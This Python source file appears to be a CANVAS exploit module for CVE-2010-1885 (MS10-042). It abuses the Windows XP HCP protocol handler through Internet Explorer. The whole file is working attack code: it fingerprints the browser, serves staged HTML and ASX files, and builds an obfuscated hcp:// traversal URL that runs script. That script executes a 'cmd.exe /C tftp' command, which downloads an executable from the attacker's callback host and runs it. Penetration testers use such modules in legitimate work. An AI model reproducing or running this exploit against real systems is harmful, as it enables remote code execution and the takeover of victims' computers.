#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2010
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

from __future__ import with_statement 

import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside

from threading import Thread
from random import randint
import os.path
from internal import devlog
import canvasengine
import random
from libs.canvasos import *


NAME="ie_hcp"
DESCRIPTION="Abuse the HCP protocol handler to execute a command"
VERSION="1.0"

NOTES="""
    Use from clientd with name ie_hcp

    Commandline usage example:
        python ./exploits/clientd/clientd.py -l 192.168.1.13 -d 5555 -O server_port:8080 -O allowed_attack_modules:ie_hcp
        ./commandlineInterface.py -v 1 -p 5555

    Needs root to run tftp server on port 69.
"""

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = "CVE-2010-1885"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1885"
DOCUMENTATION['CVSS'] = 9.3
DOCUMENTATION["Date public"] = "06/09/2010"
DOCUMENTATION["Notes"]='http://www.microsoft.com/technet/security/Bulletin/MS10-042.mspx'

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP"]
PROPERTY['MSADV'] = "MS10-042"
PROPERTY['DELIVERY']='HTTP'

#parse_qs moved to urlparse in 2.6, but is only in cgi in 2.5
try:
    from urlparse import parse_qs 
except ImportError:
    devlog("ie_help","Using parse_qs from cgi (Python 2.5)")
    from cgi import parse_qs 

import base64
from engine.config import canvas_reports_directory as reportdir
from engine.config import canvas_resources_directory as resdir

from threading import RLock
from urllib import quote_plus
from random import randint

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.name=NAME
        self.filename="iehelp.html"
        self.downexec = "starthelp.html"
        self.fileasx = "file.asx"
        self.icon = "1.jpg"
        #fill imagedata
        f = open("%s/notuseful.jpg" % resdir,"rb")
        self.icondata = f.read()
        f.close()
        self.filer = "r"+hex(randint(0,0xfffffff))+".exe"
        self.payload = "cmd.exe /C tftp -i CALLBACK GET testXXXX.exe %TEMP%\\"+self.filer+ " && %TEMP%\\"+self.filer

        return

    def done(self):
        """
        Turn off our tftpd if we have one
        """
        self.shutdown_tftpd()
        return 

    def is_vulnerable(self, info_dict):
        """
        Check to make sure this is something we want to run
        """
        self.msie8 = 0
        self.msie7 = 0
        
        #Only XP
        if "MSIE 8" in info_dict['user_agent']:
            self.log("Found vulnerable target")
            self.msie8 = 1
            #really noisy and need wmp (with win validated)
            return 30
        elif "MSIE 7" in info_dict['user_agent']:
            self.log("Found IE7")
            self.msie7 = 1
            #noisy but we don't need wmp
            return 40

        self.log("Not IE - possibly vulnerable")
        return 0

    def run(self):
        self.host=self.target.interface

        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1

    def makefile(self):
        html = """
        <html>
        <body>
        <script>
            var asx = "BASEURL/FILEASX?CANSessID=%s";
        """%(self.sessionstate.sid,)
        if self.msie8 == 1:
            html += """
            var o = document.createElement("OBJECT");
            o.setAttribute("classid", "clsid:6BF52A52-394A-11d3-B153-00C04F79FAA6");
            o.openPlayer(asx);
            """
        elif self.msie7 == 1:
            html += """
            window.location = "BASEURLDOWNEXEC"
            """
        else :
            html += """
            var o = document.createElement("IFRAME");
            o.setAttribute("src", asx);
            document.body.appendChild(o);
            """
        html += """
        </script>
        </body>
        </html>                                                                                                               
        """
        return html.replace("FILEASX", self.fileasx).replace("BASEURL",self.baseurl).replace("DOWNEXEC",self.downexec)

    def makedownexec(self):
        """Download callback and exec it"""
        html="""
            <html>
            <iframe src="hcp://services/search?query=anything&topic=hcp://system/sysinfo/sysinfomain.htm"""
        html+="%uFFFF"*94
        html+="""..%5C..%5Csysinfomain.htm%u003fsvr=%3Cscript%20defer%3Eeval%28unescape%28%27Run%2528String.fromCharCode%2528COMMAND%2529%2529%27%29%29%3C/script%3E">"""
        self.payload = self.payload.replace("CALLBACK", self.callback.ip)
        #convert to charcode
        tmp = ''
        for i in range(0,len(self.payload)):
            tmp = tmp + "%i" % (ord(self.payload[i])) + ','
        self.payload = tmp[:-1]
        #and escape
        self.payload = quote_plus(self.payload).replace("+","%2B")
        self.payload = quote_plus(self.payload)
        html = html.replace("COMMAND", self.payload)
        return html


    def makeasx(self):
        """
        Makes the ASX file we need to trigger WMP
        """
        data="""
        <ASX VERSION="3.0">
        <PARAM name="HTMLView" value="BASEURLFILEHTML?CANSessId=SESSION"/>
          <ENTRY>
            <REF href="BASEURLICON?CANSessId=SESSION"/>
          </ENTRY>
        </ASX>

        """.replace("BASEURL", self.baseurl).replace("FILEHTML",self.downexec).replace("ICON",self.icon)
        data=data.replace("SESSION",self.sessionstate.sid)
        return data 

    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        if self.plugin_info:
            info_dict=self.plugin_info
            self.log("We got a plugin info for this target - thanks clientd!")
            if self.is_vulnerable(self.plugin_info):
                self.log("This client is most likely vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable (%s)"%self.plugin_info.get("language"))
                return None, None
        else:
            self.log("Assuming vulnerable - no plugin info found!")

        #get base url
        self.baseurl = self.sessionstate.loader.canvasobj.getBaseURL()


        if not self.tftpd:
            # Set up the tftp server
            self.tftpd = self.set_up_tftp_server()
            if self.tftpd:
                self.log("Starting TFTPD thread")
                tftpd_thread = Thread(target=self.check_tftpd)
                tftpd_thread.start()

        if not self.tftpd:
            self.log("Could not start TFTPD, going to next exploit!")
            return None, None 

        if clientheader.URL.count(self.filename):
            self.log("Serving first stage")
            sploitstring = self.makefile()
            b.setBody(sploitstring)
        elif clientheader.URL.count(self.fileasx):
            self.log("Serving asx");
            sploitstring = self.makeasx()
            b.setBody(sploitstring)
        elif clientheader.URL.count(self.downexec):
            self.log("Serving downexec")
            sploitstring = self.makedownexec()
            b.setBody(sploitstring)
        elif clientheader.URL.count(self.icon):
            self.log("Serving icon")
            sploitstring = self.icondata
            b.setBody(sploitstring)
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    print "This must be run from httpserver"
    exit(0)
    app = theexploit()
    ret=standard_callback_commandline(app)

